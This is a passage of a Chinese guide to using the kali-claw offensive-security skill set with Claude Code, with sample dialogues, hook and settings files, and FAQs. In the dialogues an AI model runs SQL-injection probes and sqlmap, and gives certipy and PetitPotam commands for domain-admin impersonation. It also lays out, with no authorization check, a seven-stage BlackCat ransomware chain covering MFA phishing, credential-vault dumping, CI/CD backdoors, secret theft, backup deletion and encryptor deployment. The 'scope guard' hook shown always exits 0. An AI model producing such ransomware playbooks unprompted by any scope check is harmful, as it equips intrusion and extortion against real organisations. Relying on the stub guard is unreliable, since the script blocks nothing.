# Check whether Bash commands are within authorized scope
# Called by Claude Code PreToolUse Hook

INPUT=$(cat)
COMMAND=$(echo "$INPUT" | jq -r '.tool_input.command // empty')

# Read authorized scope file
SCOPE_FILE=".scope"
if [ ! -f "$SCOPE_FILE" ]; then
    exit 0  # No scope file means no restrictions
fi

# Log execution
echo "[$(date)] Command: $COMMAND" >> .claude-execution.log

# Check if any unauthorized target is referenced
AUTHORIZED_TARGETS=$(grep -v '^#' "$SCOPE_FILE" | grep -v '^$' | tr '\n' '|')
AUTHORIZED_TARGETS="${AUTHORIZED_TARGETS%|}"

# If command contains an IP/hostname not in scope, block it
# (Implementation omitted for brevity — full version uses regex matching)

exit 0
```

项目级 `.scope` 文件（kali-claw 项目根目录）：

```
# Authorized Test Targets
# One target per line, # is comment
192.168.1.0/24
testphp.vulnweb.com
*.example.com
```

在 `~/.claude/settings.json` 中配置 Hooks：

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "bash ~/kali-hooks/check-scope.sh"
          }
        ]
      }
    ],
    "Stop": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "echo \"[$(date)] Session ended\" >> memory/session-log.md"
          }
        ]
      }
    ]
  }
}
```

### 5.3 接入 kali-claw 验证/编排脚本（v0.1.39 新增能力）

kali-claw 的 `validation/` 目录提供 10+ 个 Bash 脚本，通过 Claude Code 的 Bash 工具可以直接调用——这是 **kali-claw + Claude Code 协作的杀手级特性**：

```
你：用 orchestrator 跑一个完整的渗透流程，目标 10.10.10.10

Claude：[Bash 工具调用]
       bash validation/orchestrator.sh --target 10.10.10.10 --phase full

       [读取输出]
       阶段 1: recon-osint 完成，发现 3 个子域名
       阶段 2: nmap 扫描完成，发现 22/80/443 开放
       阶段 3: ...

       是否继续后渗透阶段？
```

```
你：给 web-sqli 跑个分

Claude：[Bash]
       bash validation/SCORE.sh --skill web-sqli

       [结果]
       web-sqli 总分：92.0
       - skill_md: 88
       - payloads_md: 95
       - test_cases_md: 92
       - guides: 92

       分析：payloads 是最强项，skill_md 略弱（缺少 ## Defense Perspective 段落）。
       建议：在 SKILL.md 末尾补一段 Defense Perspective 可冲 94+。
```

```
你：检查工作空间健康

Claude：[Bash]
       bash validation/heartbeat.sh --json

       [解析 JSON]
       状态: HEARTBEAT_OK
       - 核心文件完整 ✓
       - skills/ 目录 111 个 ✓
       - memory/ 最近 7 天有日志 ✓
       - 备份时效 < 24h ✓

       一切正常。
```

### 5.4 完整迁移后的项目结构

```
kali-claw/                           <-- 项目根目录
├── CLAUDE.md                        <-- 项目指令（追加 Security Agent Mode）
├── .claude/
│   ├── settings.json                <-- 项目级配置
│   └── settings.local.json          <-- 本地覆盖（git ignored）
├── .mcp.json                        <-- MCP 服务器配置（新增）
├── .scope                           <-- 授权范围文件（新增）
├── SOUL.md / IDENTITY.md / ...      <-- 不变
├── skills/                          <-- 111 技能域（不变）
├── validation/                      <-- 评分 + 编排脚本（不变）
├── memory/ / chronicle/ / docs/     <-- 不变
└── bak/

~/.claude/
├── settings.json                    <-- 用户级配置（API Key、模型、权限、Hooks）
├── credentials.json                 <-- OAuth token（自动）
├── agents/                          <-- Subagents
│   ├── web-sqli-analyzer.md
│   ├── network-scanner.md
│   ├── security-auditor.md
│   ├── pam-attacker.md
│   ├── supply-chain-attacker.md
│   └── ...
├── skills/                          <-- Skills 软链（111 个）
│   ├── web-sqli -> /path/kali-claw/skills/web-sqli
│   └── ...
├── rules/
│   └── kali-claw-security.md
├── projects/
│   └── <hash>/
│       └── memory/
└── ...

~/kali-mcp-servers/                  <-- MCP 服务器（新增）
├── nmap_server.py
├── sqlmap_server.py
└── remote_nmap_server.py

~/kali-hooks/                        <-- Hook 脚本（新增）
└── check-scope.sh
```

**关键观察**：`skills/` 目录和所有内部文件保持完全不变。Claude Code 在原位置读取它们。改动仅限于：追加 `CLAUDE.md`、创建 `skills/` 之外的新文件（agents、rules、MCP servers、hooks）、在项目根目录创建 `.mcp.json` 和 `.scope`。

---

## 六、kali-claw + Claude Code 详细协作指南

> 本节是 v0.1.39 新增的核心章节。回答一个关键问题：**日常用 kali-claw + Claude Code 时，到底怎么用？**

### 6.1 七大协作模式速查

| 模式 | 场景 | 耗时 | 涉及技能 |
|------|------|------|----------|
| **A. 快速 TTP 查询** | "XX 漏洞的载荷是啥" | 5-30 秒 | 1 个技能的 payloads.md |
| **B. 单技能实战** | "测一下这个 URL 有没有 SQL 注入" | 5-15 分钟 | 1 个攻击技能 + terminal-ops |
| **C. 多技能攻击链** | "推演一下 BlackCat 勒索链" | 30 分钟-2 小时 | 5-8 个攻击技能串行 |
| **D. 完整授权渗透** | "对这个目标做完整渗透，出报告" | 2-4 小时 | engagement-manager + 5-10 个攻击技能 + pentest-reporting |
| **E. 学习/训练** | "我想学 AD CS 攻击" | 持续 | deep-research + 目标技能 + verification-loop |
| **F. 跨工具验证** | "用多种方法验证这个发现" | 15-30 分钟 | verification-loop + 2-3 个独立技能 |
| **G. 调试/复盘** | "为什么这个载荷没生效？" | 5-30 分钟 | 目标技能 + search-first + codebase-onboarding |

### 6.2 模式 A：快速 TTP 查询（最常用）

**典型对话**：

```
你：@skills/ad-cs-abuse/payloads.md ESC1 的攻击载荷是什么？

Claude：[加载 payloads.md]
      ESC1（Client Authentication + Enrollee Supplies Subject + SAN）攻击载荷：

      1. 用 certipy 找 ESC1 漏洞证书：
         certipy find -u user@domain.local -p Pass -dc-ip DC01

      2. 利用 ESC1 申请证书（冒充 administrator）：
         certipy req -u user@domain.local -p Pass -ca 'domain-CA'
            -template 'VulnTemplate' -upn administrator@domain.local

      3. 用证书申请 TGT：
         certipy auth -pfx administrator.pfx -dc-ip DC01

      4. 完成：现在你是 administrator 了。
```

**为什么用 `@` 引用而不是"读 xxx"**：`@` 是 Claude Code 的原生文件引用语法，会自动展开为 Read 工具调用，比自然语言更可靠、更省 token。

### 6.3 模式 B：单技能实战

**典型对话（5-15 分钟完整流程）**：

```
你：测一下 http://testphp.vulnweb.com/listproducts.php?cat=1 有没有 SQL 注入

Claude：[自动匹配 web-sqli-analyzer subagent]
       [加载 skills/web-sqli/SKILL.md 方法论]

       我会按 kali-claw 的 SQL 注入方法论执行 5 步检测：

       Step 1: 入口探测（单引号触发）
       [Bash] curl -s -o /dev/null -w "%{http_code}\n" \
               "http://testphp.vulnweb.com/listproducts.php?cat=1"
       [Bash] curl -s -o /dev/null -w "%{http_code}\n" \
               "http://testphp.vulnweb.com/listproducts.php?cat=1'"
       → 200 vs 200（错误被吞了，需要其他方法）

       Step 2: 布尔对比
       [Bash] curl -s "http://testphp.vulnweb.com/listproducts.php?cat=1' AND '1'='1" | wc -l
       [Bash] curl -s "http://testphp.vulnweb.com/listproducts.php?cat=1' AND '1'='2" | wc -l
       → 247 vs 14 行（差异显著，确认布尔盲注）

       Step 3: sqlmap 自动化确认
       [Bash] sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" \
                --batch --level=3 --risk=2 --dbs
       → 确认 MySQL >= 5.6，4 个数据库

       ✓ SQL 注入确认（字符型、单引号闭合、Boolean-blind）
       CVSS 估算：9.8（Critical）
       修复建议：使用 PDO 预处理语句替换字符串拼接

       是否继续数据提取？
```

**协作要点**：
- Claude 自动加载 subagent → 不需要你指定"用哪个技能"
- 每一步都有 Bash 工具的实际执行，不是纸上谈兵
- 自动按 test-cases.md 格式记录，写入 `memory/2026-06-28.md`
- 末尾给出 CVSS + 修复建议，符合 article-writing 技能的报告格式

### 6.4 模式 C：多技能攻击链（v0.1.39 杀手级场景）

**典型对话（30 分钟-2 小时，覆盖 5-8 个技能）**：

```
你：用 kali-claw 推演一下 BlackCat 勒索从初始访问到加密部署的完整链

Claude：[加载 engagement-manager + council 技能进行多技能编排]

       基于 Mandiant 2023 + CrowdStrike 2024 报告，BlackCat 典型路径：

       ╔══════════════════════════════════════════════════════════╗
       ║ 阶段 1：初始访问（sase-sse-attack + email-security-deep）  ║
       ╚══════════════════════════════════════════════════════════╝
       @skills/sase-sse-attack/payloads.md Zscaler ZIA 绕过技术...
       @skills/email-security-deep/payloads.md AiTM 钓鱼（evilginx2）...

       具体载荷（来自 payloads.md）：
       - 用 evilginx2 反向代理窃取 MFA：
         evilginx2 -p custom_proxy
         # 配置 phishing_hostname 和 target domain
       - 利用 Cobalt Strike 通过 Zscaler ZIA 出口（绕 SSL 检查）

       ╔══════════════════════════════════════════════════════════╗
       ║ 阶段 2：身份渗透（cloud-identity-attack）                  ║
       ╚══════════════════════════════════════════════════════════╝
       @skills/cloud-identity-attack/payloads.md Entra ID PRT 盗窃...

       - 用 ROADtools 拿 Primary Refresh Token：
         roadrecon auth -u compromised@contoso.com -p Pass
         roadrecon gather
       - 绕过 Conditional Access 的 7 种姿势（来自 SKILL.md）

       ╔══════════════════════════════════════════════════════════╗
       ║ 阶段 3：凭据中枢（pam-privilege-attack）                  ║
       ╚══════════════════════════════════════════════════════════╝
       @skills/pam-privilege-attack/payloads.md CyberArk PVWA 攻击...

       - CVE-2025-32564（PVWA 认证绕过）：
         # 利用细节参考 skills/pam-privilege-attack/guides/cyberark.md
       - .cue cred file 破解：
         python3 cyberark_cue_decrypt.py vault.cue
       - 一旦拿到 Vault Admin：导出所有 safes → 所有域管理员密码

       ╔══════════════════════════════════════════════════════════╗
       ║ 阶段 4：横向移动（ad-cs-abuse + ad-ldap-attack）          ║
       ╚══════════════════════════════════════════════════════════╝
       @skills/ad-cs-abuse/payloads.md ESC1 + PetitPotam...
       @skills/ad-ldap-attack/payloads.md Kerberoasting + DCSync...

       - PetitPotam + NTLM Relay → AD CS：
         python3 PetitPotam.py -u user -p Pass attacker DC01$
       - ESC1 滥用：certipy req -template VulnTemplate -upn administrator
       - Pass-the-Hash + Kerberoasting：横扫所有 DC

       ╔══════════════════════════════════════════════════════════╗
       ║ 阶段 5：防御规避（cspm-casb-attack）                      ║
       ╚══════════════════════════════════════════════════════════╝
       @skills/cspm-casb-attack/payloads.md Wiz 图谱注入...

       - 篡改 Terraform state 让 Wiz 看不到真实配置
       - OPA Rego 大小写陷阱绕过 Kyverno 策略

       ╔══════════════════════════════════════════════════════════╗
       ║ 阶段 6：持久化（ci-cd-supply-chain-attack）              ║
       ╚══════════════════════════════════════════════════════════╝
       @skills/ci-cd-supply-chain-attack/payloads.md ...

       - 在 Jenkins shared library 植入后门
       - 修改 GitHub Actions workflow 窃取 secrets
       - 用依赖混淆植入恶意 npm 包

       ╔══════════════════════════════════════════════════════════╗
       ║ 阶段 7：数据外发 + 加密部署（storage-san-attack）        ║
       ╚══════════════════════════════════════════════════════════╝
       @skills/storage-san-attack/payloads.md NetApp NDMP...

       - NetApp NDMP 快照窃取
       - 用窃取的凭据登录 Dell EMC Unity 删除备份
       - 部署 BlackCat 加密器

       ══════════════════════════════════════════════════════════
       总结：7 阶段 / 7 技能 / MITRE ATT&CK 映射：
       T1566 (Phishing) → T1078 (Valid Accounts) → T1552 (Credentials)
       → T1550 (Alternate Auth Material) → T1562 (Impair Defenses)
       → T1505 (Server Software Component) → T1486 (Data Encrypted)

       是否要我针对某一阶段深入演示 PoC？
```

**协作要点**：
- Claude 用 `@` 自动加载 7 个技能的 payloads.md，不是凭记忆说
- 每阶段给出具体命令（从真实 payloads.md 提取）
- 自动映射 MITRE ATT&CK（这是 kali-claw SKILL.md frontmatter 的 `metadata.mitre` 字段）
- 这是 kali-claw v0.1.39 的核心价值：把 7 个独立技能编成连贯攻击链

### 6.5 模式 D：完整授权渗透（最高强度协作）

**典型对话（2-4 小时）**：

```
你：授权范围见 .scope 文件。目标 10.10.10.10。做完整黑盒渗透，最后出报告。

Claude：[加载 engagement-manager subagent]
       [读取 .scope]
       [加载 safety-guard skill]

       确认授权范围：
       - 目标：10.10.10.10（in scope）
       - 时间窗口：2026-06-28 09:00 - 18:00
       - 测试类型：黑盒，无凭据
       - 排除：DoS、社工、物理入侵

       我会按 PTES + OWASP 流程执行：

       ═══ 阶段 1：侦察（30 分钟） ═══
       [加载 recon-osint + osint + deep-research]
       [Bash] bash validation/orchestrator.sh --target 10.10.10.10 --phase recon

       ... (执行中，每步征求确认)

       ═══ 阶段 2：扫描（30 分钟） ═══
       [加载 network-pentest]
       [Bash] nmap -sV -sC -p- 10.10.10.10
       [MCP] kali-nmap nmap_scan target=10.10.10.10 scan_type=-A ports=1-65535

       ...

       ═══ 阶段 3：漏洞利用（1 小时） ═══
       发现 22 (SSH)、80 (HTTP)、443 (HTTPS)、8080 (Jenkins)
       [加载 ci-cd-supply-chain-attack]
       [Bash] curl -s http://10.10.10.10:8080/jenkins/
       → Jenkins 2.441（CVE-2024-23897 args4j 任意文件读取）

       ... (利用链展开)

       ═══ 阶段 4：后渗透（30 分钟） ═══
       [加载 post-exploitation + privilege-escalation]
       ...

       ═══ 阶段 5：报告生成（30 分钟） ═══
       [加载 pentest-reporting + article-writing]
       [Bash] bash validation/report-generator.sh \
                --source memory/2026-06-28.md \
                --format markdown \
                --output reports/2026-06-28-10.10.10.10.md

       报告已生成：reports/2026-06-28-10.10.10.10.md（共 12 页）
       - 执行摘要：3 高危、2 中危、4 低危
       - 攻击链可视化：5 条独立路径，最长 6 步到 Domain Admin
       - 修复优先级：先打 CVE-2024-23897 补丁（Critical）

       同步记录到 chronicle/2026-06/28-10.10.10.10.md。
```

**协作要点**：
- `engagement-manager` 是顶层协调器，按 PTES 流程触发其他技能
- `safety-guard` 在每次工具调用前检查 `.scope`
- `validation/orchestrator.sh` 是 Bash 落地——把编排脚本和 Claude 智能结合
- 报告自动写入 `reports/` 和 `chronicle/`

### 6.6 模式 E：学习/训练

```
你：我想学 AD CS 攻击，从入门到实战

Claude：[加载 deep-research + ad-cs-abuse]
       [读取 skills/ad-cs-abuse/SKILL.md + guides/]

       基于 kali-claw 的 ad-cs-abuse 技能，给你定一个 5 天学习计划：

       Day 1：理论基础
       - 读 skills/ad-cs-abuse/SKILL.md（理解证书模板、CA 类型）
       - 读 guides/cert-templates-deep-dive.md
       - 关键概念：ENROLLEE_SUPPLIES_SUBJECT、CLIENT_AUTHENTICATION、SAN

       Day 2：ESC1-ESC4（配置错误类）
       - 用 certipy 在 lab 找漏洞证书模板
       - 实战：certipy find -u user@lab.local -p Pass -dc-ip DC01 -vulnerable

       Day 3：ESC5-ESC8（更深层的错误）
       - NTLM Relay to AD CS HTTP Endpoints（ESC8）
       - PetitPotam + NTLM Relay 链

       Day 4：CVE 复盘
       - Certifried (CVE-2022-26923)：用 certipy 完整复现
       - PKINIT 故障排查

       Day 5：检测与防御
       - 读 SKILL.md 的 Defense Perspective 段落
       - 部署 10 条 KQL/SPL/Sigma 检测规则（来自 guides/detection-rules.md）

       实验环境建议：
       docker run -d -p 389:389 --name lab-dc lab.local/dc:latest
       # 或者用 GOAD（Game Of Active Directory）项目

       是否要我先帮你搭建 lab？
```

### 6.7 模式 F：跨工具验证（verification-loop）

```
你：我刚才用 sqlmap 发现了 SQL 注入，但客户说没复现。帮我独立验证一下。

Claude：[加载 verification-loop skill]
       [读取 skills/verification-loop/SKILL.md 4 阶段流程]

       独立验证流程：

       Verification 1：手动 curl（不依赖 sqlmap）
       [Bash] curl -s "http://target/page?id=1' UNION SELECT database(),version(),user()-- -"
       → 输出包含数据库名、版本、用户名 → 确认

       Verification 2：Burp Suite Repeater（不同 HTTP 客户端）
       - 我会给出 Burp 完整请求包，你在 Burp 里发
       - 这验证不是 curl/sqlmap 的客户端特殊性

       Verification 3：时间盲注独立确认
       [Bash] time curl -s "http://target/page?id=1' AND SLEEP(5)-- -"
       → 响应时间 5.0+ 秒 → 独立确认

       Verification 4：错误日志交叉比对
       [Bash] (如果有日志访问) grep -i "sql" /var/log/mysql/error.log

       ✓ 4 种独立方法全部确认 SQL 注入存在
       ✓ 不依赖任何单一工具

       写入 verification 报告：memory/2026-06-28-sqli-verification.md
```

### 6.8 模式 G：调试/复盘

```
你：我用 certipy 跑 ESC1，但是失败了。日志说 "certificate request denied"。

Claude：[加载 search-first + ad-cs-abuse]
       [读取 skills/ad-cs-abuse/guides/troubleshooting.md]

       常见 ESC1 失败原因（按出现频率）：

       1. 证书模板需要 CA Manager 审批（Pending 模式）
          检查：certutil -view -restrict "Request Disposition=Pending"
          解决：换其他不需要审批的 ESC1 模板

       2. 目标用户没有 Enroll 权限
          检查： certutil -view -restrict "Template=<TemplateName>"
          解决：用 PKI Health Check 工具找权限配置

       3. CA 服务不可达（RPC 端口被防火墙挡）
          检查：nc -z DC01 135 && nc -z DC01 49152-65535
          解决：开 RPC 端口

       4. 证书模板实际不是 ESC1（识别错了）
          检查： certipy template -u user -p Pass -template <name> -save
          解决：重新跑 certipy find -vulnerable 确认

       请贴出完整命令和报错，我精确定位。
```

### 6.9 协作最佳实践

**DO**：

- **用 `@` 引用文件**，而不是"读取 xxx 文件"——更可靠、更省 token
- **复杂任务先开 Plan Mode**（Shift+Tab）让 Claude 列计划，确认后再执行
- **长期会话用 `/compact`** 智能压缩历史，避免上下文溢出
- **写完一个发现立刻 `/memory add`**，让 Claude 记到 `MEMORY.md`
- **跑长任务用 `--max-turns 50`** 避免 Claude 中途停下
- **用 `/agents` 管理 subagents**，定期清理过时的

**DON'T**：

- **不要凭印象写载荷**——让 Claude 从 payloads.md 取，避免幻觉
- **不要让 Claude 跳过 safety-guard**——授权范围检查是设计上的安全闸
- **不要在没看 diff 前接受写文件**——用 Shift+Tab 进 Plan Mode 看改动
- **不要在 memory 文件里写真凭据**——kali-claw 规则明确禁止
- **不要把 111 个技能全建成 subagent**——选 5-10 个高频的就够

---

## 七、使用场景

### 7.1 渗透测试完整流程

（参见 §6.5 模式 D 的完整示例）

### 7.2 安全审计

```
你：使用 security-auditor 智能体对 http://testphp.vulnweb.com 进行 OWASP 审计

Claude：[加载 security-auditor subagent]
       [读取 skills/security-review/SKILL.md]
       按 OWASP Top 10 逐项审计：

       A01 - Broken Access Control
       [检查] 发现 IDOR，可越权访问其他用户数据

       A02 - Cryptographic Failures
       [检查] HTTP 未强制跳转 HTTPS

       A03 - Injection
       [检查] 发现 SQL 注入和 XSS

       A05 - Security Misconfiguration
       [检查] 默认配置，错误信息暴露堆栈

       A07 - Auth Failures
       [检查] 登录无速率限制，可暴力破解

       总体评分：高风险
       优先修复：A03 Injection + A01 Access Control
```

### 7.3 学习与研究

（参见 §6.6 模式 E）

### 7.4 Council 多视角分析

```
你：用 council 模式分析发现的 SQL 注入漏洞

Claude：[加载 skills/council/SKILL.md]
       启动 Council 多视角分析：

       [攻击者视角]
       - 可通过 SQL 注入获取数据库完全控制
       - 通过 FILE 权限可能实现 RCE
       - 建议测试：写 WebShell、读 /etc/passwd

       [防御者视角]
       - 根本原因：未使用参数化查询
       - 修复方案：预处理语句 + WAF
       - 检测方案：监控异常 SQL 查询

       [审计者视角]
       - CVSS：9.8 (Critical)
       - 合规影响：违反 OWASP A03、PCI-DSS 6.5
       - 需书面记录完整攻击链

       综合建议：立即修复，同时检查其他页面同类问题。
```

### 7.5 报告生成

```
你：帮我生成今天所有发现的安全报告

Claude：[加载 skills/article-writing/SKILL.md]
       按 article-writing 方法论生成：

       ## 安全评估报告

       ### 元信息
       - 评估日期：2026-06-28
       - 目标：target.com
       - 方法论：OWASP Top 10 + PTES

       ### 发现摘要
       | ID | 标题 | CVSS | 状态 |
       |----|------|------|------|
       | V-001 | SQL Injection | 9.8 | Open |
       | V-002 | XSS (Reflected) | 6.1 | Open |
       | V-003 | IDOR | 5.3 | Open |

       ### 详细发现
       [每个漏洞：描述、复现步骤、证据、影响、修复建议]

       [报告写入 memory/2026-06-28-report.md]
```

---

## 八、常见问题

### Q1: Claude Code 可以在 Kali Linux 上运行吗？

可以。Kali Linux 基于 Debian，三种方式都支持：

```bash
# 方式 1：原生安装器（推荐）
curl -fsSL https://claude.ai/install.sh | bash

# 方式 2：npm（需要 Node.js >= 18）
sudo apt install -y nodejs npm
npm install -g @anthropic-ai/claude-code

# 方式 3：nvm + npm
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.0/install.sh | bash
nvm install --lts
npm install -g @anthropic-ai/claude-code

# 验证
claude --version
```

### Q2: MCP 服务器无法连接

```bash
# 1. 检查 Python 和 MCP SDK
python3 --version
pip show mcp

# 2. 手动测试 MCP 服务器
python3 ~/kali-mcp-servers/nmap_server.py
# 应无报错启动

# 3. 检查 .mcp.json 路径（用绝对路径）
cat .mcp.json

# 4. 在 Claude 内查看 MCP 状态
/mcp

# 5. 权限
chmod +x ~/kali-mcp-servers/*.py
```

### Q3: 自定义 Subagent 不触发

```bash
# 1. 检查位置
ls ~/.claude/agents/

# 2. 检查 frontmatter
head -8 ~/.claude/agents/web-sqli-analyzer.md
# 必须以 --- 开头，含 name + description

# 3. 在会话内查看
/agents

# 4. description 要够描述性（Claude 按 description 匹配）
# Bad:  description: A security tool
# Good: description: SQL injection specialist. Covers Union/Blind/Time-based/Error-based. Use PROACTIVELY for any SQLi task.
```

### Q4: 如何保持 kali-claw 项目更新

```bash
cd kali-claw
git pull origin main

# Skills 软链会自动看到新内容，无需重建
# Subagents 引用文件路径，内容更新自动生效

# 拉取后跑一次质量评分
bash validation/SCORE.sh
```

### Q5: Claude Code 的记忆会丢失吗

不会。Claude Code 的记忆存储在 `~/.claude/projects/<hash>/memory/` 磁盘文件中。即使关闭 Claude Code，下次打开同一项目记忆仍在。

### Q6: 如何使用 Skills 系统

Claude Code 2025 起原生支持 Skills 目录。三种用法：

1. **Skills 目录**（推荐）：`~/.claude/skills/<name>/SKILL.md` 自动扫描
2. **Subagent**：高频技能转成 subagent，含工具权限和操作流程
3. **手动引用**：`@skills/<name>/SKILL.md` 在对话中直接引用

### Q7: 能否同时用 OpenClaw 和 Claude Code

可以。两者共用同一个 `skills/` 目录：

- **OpenClaw** 读 `SOUL.md` + `AGENTS.md` + `skills/` 作为工作空间
- **Claude Code** 读 `CLAUDE.md` + `~/.claude/agents/` + `skills/` 作为项目

它们不冲突，只是运行时不同。可以根据场景选择：

- **重编排、多智能体协作、自动化循环** → OpenClaw（更强的工作空间生命周期管理）
- **日常开发、IDE 集成、原生 Claude 能力** → Claude Code（更好的对话体验和上下文）

### Q8: 远程 Kali 怎么配置

三种方式：

1. **SSH 直连**：Claude Code 用 Bash 工具执行 `ssh user@kali-host "nmap ..."`
2. **MCP 远程模式**：MCP 服务器通过 SSH 调用远程 Kali 工具（见 §5.1）
3. **VS Code Remote**：VS Code Remote SSH 连到 Kali，远程终端跑 Claude Code

### Q9: 需要修改 kali-claw 的 skills 文件吗

**不需要**。这是本指南的核心设计原则。`skills/` 目录下所有 111 个技能域保持完全不变。Claude Code 在原位置读取。迁移只涉及：

- 追加 `CLAUDE.md`（项目级配置，不是技能文件）
- 在 `~/.claude/agents/` 创建引用 `skills/` 路径的新文件
- 在 `~/.claude/skills/` 创建软链
- 在 `~/.claude/rules/` 创建规则文件
- 创建 MCP 服务器、Hook 脚本

这些步骤都不触碰 `skills/` 下任何文件。

### Q10: 如何为 111 个技能创建 Subagent

**不需要全建**。建议策略：

- **高频技能建 Subagent**（5-10 个）：web-sqli、network-pentest、ad-cs-abuse、pam-privilege-attack、ci-cd-supply-chain-attack、cloud-identity-attack、kubernetes-attack、security-auditor
- **其他建 Skills 软链**（一次性 111 个）：通过 §4.2 的批量软链脚本
- **偶尔用的技能**：直接 `@skills/<name>/SKILL.md` 引用（最小迁移思路）

### Q11: Claude Code 在国内访问不稳定怎么办

- **配置代理**：`export HTTPS_PROXY=http://your-proxy:port`
- **使用 Bedrock / Vertex AI**：通过 AWS / GCP 入口，不直连 Anthropic
- **切换 npm 镜像**：`npm config set registry https://registry.npmmirror.com`（仅影响 npm 包下载，不影响运行时）
- **使用 Anthropic API 中转**：自建反代，把 `ANTHROPIC_BASE_URL` 指向反代

### Q12: 如何对接 kali-claw 的 SCORE.sh 质量体系

Claude Code 直接用 Bash 工具调用：

```bash
# 给单个技能打分
> 给 web-sqli 跑个分

Claude：[Bash]
       bash validation/SCORE.sh --skill web-sqli
       → 92.0 (Distinguished)

# 找最薄弱的技能
> 列出分数最低的 5 个技能

Claude：[Bash]
       bash validation/SCORE.sh | jq 'sort_by(.overall_score) | .[0:5]'
```

### Q13: Plan Mode 和正常模式有什么区别

Plan Mode（Shift+Tab）下 Claude **只读不写**：
- 可以读文件、跑只读命令（grep、find、ls）
- 不能 Write / Edit / 跑破坏性 Bash
- 适合：先看一遍项目再动手、出实施计划、检查 Claude 理解对不对

退出 Plan Mode（ExitPlanMode 工具）后才能执行改动。

### Q14: 如何让 Claude 自动加载多个技能（多技能编排）

三种方式：

1. **engagement-manager subagent**（推荐）：专门做编排，会按 PTES 流程触发其他技能
2. **council skill**：用多视角分析强制覆盖攻击/防御/审计三方
3. **CLAUDE.md 指令**：在项目指令里写"复杂任务必须先读 skills/deep-research/SKILL.md 做规划"

---

## 九、架构对比与参考

### 9.1 完整映射表

| kali-claw (OpenClaw) | Claude Code | 迁移方式 |
|---------------------|------------|---------|
| `SOUL.md`（人格） | `CLAUDE.md` | 追加关键内容 |
| `USER.md`（用户信息） | `CLAUDE.md` / `~/.claude/settings.json` | 手动配置 |
| `AGENTS.md`（会话配置） | `CLAUDE.md` + `~/.claude/rules/` | 提取规则 |
| `skills/*/SKILL.md` | `~/.claude/skills/`（软链）+ `~/.claude/agents/`（高频） | 软链为主，subagent 为辅 |
| `skills/*/payloads.md` | 项目文件（subagent 引用） | 保持原位 |
| `skills/*/test-cases.md` | 项目文件（subagent 引用） | 保持原位 |
| `skills/*/guides/` | 项目文件 | 保持原位 |
| `MEMORY.md` | `~/.claude/projects/.../memory/` | 复制 |
| `memory/*.md` | `~/.claude/projects/.../memory/` | 复制近期 |
| `chronicle/` | 项目文件 | 保持原位 |
| `TOOLS.md` | 项目文件 + MCP 服务器 | 部分转换 |
| `HEARTBEAT.md` | `~/.claude/settings.json` Hooks | 手动配置 |
| `validation/SCORE.sh` | Bash 工具直接调用 | 不迁移，直接用 |
| `validation/orchestrator.sh` | Bash 工具直接调用 | 不迁移，直接用 |
| `validation/engagement-template/` | `.scope` 文件 + engagement-manager | 部分转换 |
| 12 Hacker Laws | `~/.claude/rules/` | 提取为规则 |

### 9.2 迁移检查清单

**最小迁移**（5 分钟）：

- [ ] 原生安装器装好 Claude Code（`curl -fsSL https://claude.ai/install.sh | bash`）
- [ ] 完成认证（OAuth 或 API Key）
- [ ] 克隆 kali-claw 项目
- [ ] 在项目目录中 `claude` 启动
- [ ] 用 `@CLAUDE.md` 验证能读到项目说明

**标准迁移**（30 分钟）：

- [ ] 完成 §4.1：追加 Security Agent Mode 到 `CLAUDE.md`
- [ ] 完成 §4.2：批量软链 111 个技能到 `~/.claude/skills/`
- [ ] 完成 §4.3：创建 5-10 个高频 subagent
- [ ] 完成 §4.4：创建 `~/.claude/rules/kali-claw-security.md`
- [ ] 完成 §4.5：配置 `~/.claude/projects/<hash>/memory/`
- [ ] `/skills` 验证能看到 111 个技能

**完整迁移**（2-3 小时）：

- [ ] 完成所有标准迁移
- [ ] 完成 §5.1：创建 MCP 服务器（nmap、sqlmap、可选远程）
- [ ] 完成 §5.2：配置 Hooks（PreToolUse + Stop）
- [ ] 完成 §5.3：测试 `bash validation/SCORE.sh` 和 `bash validation/orchestrator.sh`
- [ ] 创建 `.scope` 授权范围文件
- [ ] 端到端测试：完整授权渗透 + 报告生成

### 9.3 性能对比

| 指标 | OpenClaw | Claude Code |
|------|----------|-------------|
| 首次启动 | 需安装框架 + 创建智能体 | 原生安装器 + OAuth，5 分钟内 |
| 技能加载 | 会话启动时全部加载 | 渐进式披露（frontmatter → SKILL.md → 详细） |
| 工具调用 | 通过终端命令 | Bash + MCP（结构化 I/O） |
| 上下文窗口 | 受框架限制 | Claude 原生（200K+ tokens，含 Extended Thinking） |
| 多会话 | 支持多智能体 | 多 Tab + `--resume` |
| 更新维护 | 需同步框架和技能 | `git pull` + `claude update` |
| IDE 集成 | 无 | VS Code / JetBrains 原生 |
| 调试 | 文件级日志 | `/status` 实时 token、Ctrl+O 详细模式 |

---

_Built with Claude Code + kali-claw v0.1.39（111 技能域 / 33 Distinguished / 100% Excellent+）。如有问题，请在 GitHub Issues 中反馈。_
